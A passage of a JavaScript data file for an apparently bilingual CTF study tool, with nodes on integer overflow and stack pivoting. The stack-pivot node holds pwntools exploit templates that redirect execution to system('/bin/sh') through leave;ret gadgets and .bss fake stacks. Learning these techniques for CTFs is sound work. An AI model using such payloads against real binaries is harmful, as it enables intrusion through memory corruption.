      { label: "ROP chain nécessaire (NX actif)", label_en: "ROP chain required (NX active)", next: "rop_chain", icon: "⛓️" },
      { label: "Heap exploitation", label_en: "Heap exploitation", next: "heap_exploit", icon: "🗑️" }
    ]
  },

  "pwn_integer_overflow": {
    id: "pwn_integer_overflow", title: "Integer Overflow / Underflow", title_en: "Integer Overflow / Underflow", category: "ctf", icon: "🔢",
    description: "Les débordements d'entiers permettent de bypasser des validations de taille, provoquer des allocations sous-dimensionnées ou corrompre des calculs. Source : hacktricks binary-exploitation/integer-overflow-and-underflow.",
    description_en: "Integer overflows allow bypassing size validations, causing undersized allocations, or corrupting computations. Source: hacktricks binary-exploitation/integer-overflow-and-underflow.",
    commands: [
      { label: "Limites des types entiers", label_en: "Integer type limits", cmd: "# Types et limites :\n# int8_t   (8-bit signé)   : -128 à 127\n# uint8_t  (8-bit non signé): 0 à 255\n# int16_t  (short)         : -32768 à 32767\n# uint16_t                 : 0 à 65535\n# int32_t  (int)           : -2147483648 à 2147483647\n# uint32_t                 : 0 à 4294967295\n# int64_t  (long)          : -9223372036854775808 à max\n# Overflow uint8 : 255 + 1 = 0\n# Overflow int8  : 127 + 1 = -128\n# Overflow uint32: 2^32 (4294967296) → 0" },
      { label: "Détecter avec sanitizers", label_en: "Detect with sanitizers", cmd: "# Compiler avec détection :\ngcc -fsanitize=address,undefined -o binary binary.c\nclang -fsanitize=integer -o binary binary.c\n# Fuzzing rapide :\nfor val in 0 1 -1 127 128 255 256 32767 32768 65535 65536 2147483647 2147483648 4294967295 4294967296; do\n  echo \"Test: $val\"\n  echo $val | ./binary 2>&1 | tail -1\ndone" },
      { label: "Pattern classique : count*size → undersized malloc", label_en: "Classic pattern: count*size → undersized malloc", cmd: "# Vulnérabilité fréquente en CTF :\n# uint32_t total = (uint32_t)(count * elem_size); // overflow !\n# void* buf = malloc(total);   // trop petit\n# memcpy(buf, data, real_size); // heap overflow !\n\n# Exemple : count=4294967296, elem_size=1\n# (uint32_t)(4294967296 * 1) = 0\n# malloc(0) → tiny chunk\n# memcpy écrit des GBs → corruption heap\n\n# En CTF : envoyer count=2^32 ou count qui wrappe à 0 ou 32" },
      { label: "Confusion signed/unsigned", label_en: "Signed/unsigned confusion", cmd: "# Validation signed mais utilisation unsigned :\n# int len = user_input;    // -1 passé\n# if (len > MAX) return;   // -1 < MAX → valide !\n# memcpy(buf, src, len);   // (size_t)(-1) = 0xFFFF... → overflow !\n\n# Valeurs à tester :\n# -1, -2, INT8_MIN (-128), INT16_MIN (-32768), INT32_MIN (-2147483648)\n# En binaire : envoyer 0xFFFFFFFF comme uint32 (= -1 en int32)" },
      { label: "Off-by-one (fence-post error)", label_en: "Off-by-one (fence-post error)", cmd: "# char buf[64]; memcpy(buf, input, strlen(input)+1);  // +1 null byte déborde\n# Permet d'écraser le null byte du canary !\n# Ou de modifier flags/length dans la structure suivante\n\n# Détecter :\n# Tester exactement buffer_size, buffer_size+1, buffer_size+2\npython3 -c \"print('A'*64)\" | ./binary  # exact\npython3 -c \"print('A'*65)\" | ./binary  # +1" }
    ],
    lookfor: [
      "Calcul `count * size` casté en 32-bit → wrappe à 0 → malloc trop petit",
      "Validation signed int + utilisation comme size_t → envoyer -1",
      "Off-by-one sur buffer → un byte écrase le null byte du canary",
      "Comparaisons `<` ou `>` entre signed et unsigned",
      "Conversions implicites dans les conditions de boucle"
    ],
    lookfor_en: [
      "Calculation `count * size` cast to 32-bit → wraps to 0 → malloc too small",
      "Signed int validation + use as size_t → send -1",
      "Off-by-one on buffer → one byte overwrites the canary null byte",
      "`<` or `>` comparisons between signed and unsigned",
      "Implicit conversions in loop conditions"
    ],
    tips: [
      "Valeur magique : 2^32 = 4294967296 pour overflow uint32 → 0",
      "AddressSanitizer + UBSan révèlent tous les overflows à la compilation",
      "En CTF web (PHP/JS) : MAX_SAFE_INTEGER (2^53-1) a des comportements spéciaux",
      "Pattern CTF fréquent : count*size overflow → heap buffer trop petit → corruption"
    ],
    tips_en: [
      "Magic value: 2^32 = 4294967296 for uint32 overflow → 0",
      "AddressSanitizer + UBSan reveal all overflows at compile time",
      "In web CTF (PHP/JS): MAX_SAFE_INTEGER (2^53-1) has special behaviors",
      "Common CTF pattern: count*size overflow → heap buffer too small → corruption"
    ],
    choices: [
      { label: "Overflow mène à heap buffer overflow", label_en: "Overflow leads to heap buffer overflow", next: "heap_exploit", icon: "🗑️" },
      { label: "Overflow bypass validation → stack overflow", label_en: "Overflow bypasses validation → stack overflow", next: "bof_basic", icon: "💥" },
      { label: "Retour aux protections binaires", label_en: "Back to binary protections", next: "pwn_protections", icon: "🛡️" }
    ]
  },

  "pwn_stack_pivot": {
    id: "pwn_stack_pivot", title: "Stack Pivoting (leave;ret / EBP chaining)", title_en: "Stack Pivoting (leave;ret / EBP chaining)", category: "ctf", icon: "🔄",
    description: "Rediriger RSP vers une zone contrôlée quand le buffer est trop petit pour une ROP chain complète. Utilise 'leave;ret' et la manipulation de RBP. Source : hacktricks binary-exploitation/stack-overflow/stack-pivoting.",
    description_en: "Redirect RSP to a controlled area when the buffer is too small for a full ROP chain. Uses 'leave;ret' and RBP manipulation. Source: hacktricks binary-exploitation/stack-overflow/stack-pivoting.",
    commands: [
      { label: "Comprendre le gadget leave;ret", label_en: "Understand the leave;ret gadget", cmd: "# 'leave' = mov rsp, rbp ; pop rbp\n# Puis 'ret' consomme [RSP] comme RIP\n# → Contrôler RBP + gadget leave;ret = contrôler RSP !\n# Trouver le gadget :\nROPgadget --binary binary --rop | grep 'leave ; ret'\nropper -f binary --search 'leave; ret'\n# Alternative :\nROPgadget --binary binary --rop | grep 'pop rsp'" },
      { label: "EBP2Ret — technique fondamentale", label_en: "EBP2Ret — fundamental technique", cmd: "python3 << 'EOF'\nfrom pwn import *\nbinary = ELF('./binary')\np = process('./binary')\n\nleave_ret = 0x401234    # gadget leave;ret\nfake_stack = 0x404100   # .bss : zone writable à adresse fixe\n\n# Préparer la ROP chain dans .bss (via un write primitif précédent)\nrop_chain = flat(\n    p64(0),                          # faux RBP (consommé par pop rbp)\n    p64(binary.plt['system']),        # appelé par ret\n    p64(next(binary.search(b'/bin/sh')))\n)\n# Écrire rop_chain à fake_stack d'abord !\n\n# Payload final :\n# pad + faux RBP (pointe vers fake_stack) + leave;ret\npayload = b'A'*offset + p64(fake_stack) + p64(leave_ret)\np.sendline(payload)\np.interactive()\nEOF" },
      { label: "Off-by-one sur RBP → pivot minimal", label_en: "Off-by-one on RBP → minimal pivot", cmd: "# Quand on ne peut écraser que 1 byte de RBP :\n# Modifier le LSB pour pointer dans une page proche\n# Le nouveau RBP doit contenir notre ROP chain\n# Technique : RET sled + ROP chain à la fin\npython3 << 'EOF'\nfrom pwn import *\np = process('./binary')\n# Null byte sur le dernier byte de RBP :\npayload = b'A'*buffer_size + b'\\x00'\np.sendline(payload)\nEOF" },
      { label: "EBP chaining — pivot en cascade", label_en: "EBP chaining — cascading pivot", cmd: "python3 << 'EOF'\nfrom pwn import *\nbinary = ELF('./binary')\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n\nleave_ret = 0x401234\nfake1 = 0x404100  # zone .bss\n\n# Chaque fake frame : [&next_rbp][func_addr][leave;ret][arg...]\nfake_chain = flat(\n    0x0,                          # next fake RBP (fin de chaîne)\n    libc.sym['system'],\n    leave_ret,\n    next(libc.search(b'/bin/sh'))\n)\n# Écrire fake_chain à fake1, puis déclencher le pivot\nEOF" }
    ],
    lookfor: [
      "Gadget 'leave ; ret' dans le binaire → stack pivot possible",
      "Buffer overflow trop petit pour une ROP chain complète → pivot vers .bss",
      "Off-by-one sur RBP sauvegardé → modifier seulement le LSB",
      "Zone .bss à adresse fixe même avec PIE (souvent accessible en écriture)",
      "Gadget 'pop rsp' pour pivot RSP direct"
    ],
    lookfor_en: [
      "Gadget 'leave ; ret' in the binary → stack pivot possible",
      "Buffer overflow too small for a full ROP chain → pivot to .bss",
      "Off-by-one on saved RBP → modify only the LSB",
      ".bss section at fixed address even with PIE (often writable)",
      "Gadget 'pop rsp' for direct RSP pivot"
    ],
    tips: [
      "Stack pivoting = solution quand l'overflow permet seulement 1-2 gadgets",
      ".bss est souvent à adresse fixe même si PIE → idéal pour la fake stack",
      "En 64-bit : alignement 16 bytes avant system() → ajouter un 'ret' gadget",
      "EBP chaining permet de chaîner plusieurs appels comme une mini-ROP chain"
    ],
    tips_en: [
      "Stack pivoting = solution when the overflow allows only 1-2 gadgets",
      ".bss is often at a fixed address even with PIE → ideal for the fake stack",
      "In 64-bit: 16-byte alignment before system() → add a 'ret' gadget",
      "EBP chaining allows chaining multiple calls like a mini-ROP chain"
    ],
    choices: [
      { label: "ROP chain complète", label_en: "Full ROP chain", next: "rop_chain", icon: "⛓️" },
      { label: "Retour à binary exploitation", label_en: "Back to binary exploitation", next: "binary_exploit", icon: "💣" }
    ]
  }

});

// reverse_eng -> ajouter lien vers binary exploit
NODES["reverse_eng"].choices.push(
  { label: "Vulnérabilité d'exploitation identifiée → pwn", label_en: "Exploitation vulnerability identified → pwn", next: "binary_exploit", icon: "💣" }
);

// binary_exploit → liens vers nouveaux nœuds
NODES["binary_exploit"].choices.push(
  { label: "Comprendre les protections (ASLR, PIE, NX, Canary, RELRO)", label_en: "Understand protections (ASLR, PIE, NX, Canary, RELRO)", next: "pwn_protections", icon: "🛡️" },
  { label: "Integer overflow / underflow", label_en: "Integer overflow / underflow", next: "pwn_integer_overflow", icon: "🔢" },
  { label: "Stack pivoting (buffer trop petit pour ROP)", label_en: "Stack pivoting (buffer too small for ROP)", next: "pwn_stack_pivot", icon: "🔄" }
);

// start -> ajouter CTF entry points
NODES["start"].choices.push(
  { label: "Challenge CTF Web (SSRF, XXE, SSTI, JWT…)", label_en: "CTF Web challenge (SSRF, XXE, SSTI, JWT…)", next: "web_ctf_patterns", icon: "🌐" },
  { label: "Challenge CTF Pwn / Binary Exploitation", label_en: "CTF Pwn / Binary Exploitation challenge", next: "binary_exploit", icon: "💣" },
  { label: "Challenge CTF Misc (jail, OSINT, encodages…)", label_en: "CTF Misc challenge (jail, OSINT, encodings…)", next: "misc_ctf", icon: "🎲" },
  { label: "Stéganographie avancée (LSB, audio, binwalk)", label_en: "Advanced steganography (LSB, audio, binwalk)", next: "stego_advanced", icon: "🖼️" }
);

console.log("[CTF Bible] CTF Techniques chargées :", Object.keys(NODES).length, "nœuds au total");
